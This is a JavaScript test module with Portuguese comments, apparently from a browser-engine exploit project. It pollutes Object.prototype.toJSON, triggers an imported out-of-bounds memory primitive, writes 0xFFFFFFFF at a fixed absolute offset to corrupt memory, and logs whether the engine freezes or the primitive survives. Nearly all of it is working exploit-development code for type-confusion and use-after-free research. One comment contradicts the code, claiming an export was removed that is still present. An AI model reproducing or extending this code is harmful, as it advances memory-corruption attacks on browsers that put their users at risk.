// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const TEST_PARAMS = {
    victim_ab_size: 64, // Não usado diretamente com stringify neste teste, mas pode influenciar heap
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKeyToPollute: 'toJSON',
};

// Contador global importado de runAllAdvancedTestsS3.mjs para ser resetado por ele
export let globalCallCount_toJSON = 0; // Removido 'export', será gerenciado pelo chamador se necessário

export async function executePPThenOOBWriteTest(
    testVariantDescription,
    toJSONFunctionLogic // A função que será usada como Object.prototype.toJSON
) {
    const FNAME_TEST = `executePPThenOOBWrite<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset,
        value_to_write,
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = TEST_PARAMS;

    logS3(`--- Iniciando Teste (PP then OOB Write): ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}`, "info", FNAME_TEST);
    document.title = `Iniciando: ${testVariantDescription}`;

    // Resetar o contador global a partir do runAllAdvancedTestsS3 ou aqui se for específico
    // Para este design, runAllAdvancedTestsS3 irá gerenciar o reset antes de cada chamada a esta função
    // ou a própria função toJSON pode usar um contador local/closure se preferir total isolamento.
    // Para o globalCallCount_toJSON ser efetivo como contador entre chamadas da mesma toJSON dentro de um stringify,
    // ele precisa ser resetado FORA da lógica da toJSON, antes do stringify.
    // Se cada toJSONFunctionLogic tem seu próprio contador interno, isso não é um problema.
    // A versão atual em runAllAdvancedTestsS3 reseta globalCallCount_toJSON implicitamente ao redefinir as funções.
    // Vamos assumir que as funções toJSON usam o globalCallCount_toJSON importado para este exemplo.
    // No runAllAdvancedTestsS3.mjs, cada função toJSON_VariantX usa o globalCallCount_toJSON.
    // É crucial que o `runAllAdvancedTestsS3.mjs` resete `globalCallCount_toJSON = 0;` antes de chamar `executePPThenOOBWriteTest`
    // se a intenção é que cada teste de variante comece a contagem do zero para suas chamadas internas de toJSON.
    // OU, mais simples, cada `toJSON_VariantX` usa um contador local se as chamadas não são aninhadas de forma complexa.
    // A implementação atual das variantes de toJSON em runAllAdvancedTestsS3 já usa globalCallCount_toJSON.
    // E a `runSimplificationStepByStep` não o reseta entre chamadas a `executePPThenOOBWriteTest`.
    // Para este teste específico, queremos que `globalCallCount_toJSON` seja resetado antes de CADA `executePPThenOOBWriteTest`.
    // Portanto, o reset deve estar em `runSimplificationStepByStep` ou aqui.
    // Vamos colocar o reset aqui para garantir que cada execução desta função comece limpa.
    globalCallCount_toJSON = 0; 


    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return;
    }
    document.title = "OOB Configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size); // Criado, mas JSON.stringify não será chamado nele neste teste
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = false;
    let stepReached = "antes_pp";
    let potentiallyFroze = true; 

    try {
        logS3(`Tentando poluir Object.prototype.${ppKeyToPollute} com lógica: ${testVariantDescription}`, "info", FNAME_TEST);
        document.title = `Aplicando PP: ${testVariantDescription}`;
        stepReached = "aplicando_pp";

        Object.defineProperty(Object.prototype, ppKeyToPollute, {
            value: toJSONFunctionLogic,
            writable: true, configurable: true, enumerable: false
        });
        pollutionAppliedThisRun = true;
        logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
        stepReached = "pp_aplicada";
        document.title = `PP Aplicada: ${testVariantDescription}`;

        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB: ${testVariantDescription}`;

        oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
        
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB: ${testVariantDescription}`;
        potentiallyFroze = false; 

        // NÃO chamaremos JSON.stringify(victim_ab) aqui. O foco é o congelamento na escrita OOB.
        // Apenas uma leitura de controle para ver se a primitiva ainda está viva.
        try {
            logS3("Tentando leitura de controle da oob_dataview_real...", "info", FNAME_TEST);
            let testRead = oob_dataview_real.getUint32(0, true);
            logS3(`Leitura de controle da oob_dataview_real (offset 0) retornou: ${toHex(testRead)}`, "good", FNAME_TEST);
            document.title = `Leitura DV OK: ${testVariantDescription}`;
        } catch (e_dv) {
            logS3(`ERRO ao ler da oob_dataview_real: ${e_dv.name} - ${e_dv.message}`, "error", FNAME_TEST);
            document.title = `ERRO Leitura DV: ${testVariantDescription}`;
            // Se a leitura falhar, isso não é o congelamento que estamos procurando, mas é um erro.
            potentiallyFroze = false; // Foi um erro JS, não um congelamento silencioso na escrita OOB.
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal: ${testVariantDescription}`;
        potentiallyFroze = false;
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
        if (potentiallyFroze) { // Se não chegou a "apos_escrita_oob" ou um erro explícito
            logS3(`O TESTE PODE TER CONGELADO DURANTE/APÓS A ESCRITA OOB. Último passo logado: ${stepReached}`, "warn", FNAME_TEST);
            document.title = `CONGELOU? Passo: ${stepReached} - ${testVariantDescription}`;
        }
    }
    logS3(`--- Teste (PP then OOB Write) Concluído: ${testVariantDescription} (Chamadas toJSON (se houver): ${globalCallCount_toJSON}) ---`, "test", FNAME_TEST);
    if (!potentiallyFroze) {
        document.title = `Teste Concluído Sem Congelamento na Escrita OOB: ${testVariantDescription}`;
    }
}
